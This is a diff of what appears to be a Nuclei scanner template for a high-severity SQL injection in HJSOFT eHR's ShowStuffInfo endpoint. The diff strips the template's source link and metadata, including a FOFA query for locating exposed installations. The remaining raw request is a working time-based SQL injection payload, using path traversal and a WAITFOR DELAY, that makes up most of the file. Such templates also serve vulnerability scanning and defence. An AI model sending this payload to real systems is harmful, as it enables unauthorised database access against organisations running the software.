@@ -3,12 +3,8 @@ info:
   name: 宏景eHR ShowStuffInfo 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rzr9xdgzkl9n1l80'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: rzr9xdgzkl9n1l80
-    fofa: app="HJSOFT-HCM"
 http:
 - raw:
   - 'GET /templates/attestation/../../jp_contest/personinfo/ShowStuffInfo?id=1'';WAITFOR+DELAY+''0:0:5''--+ HTTP/1.1
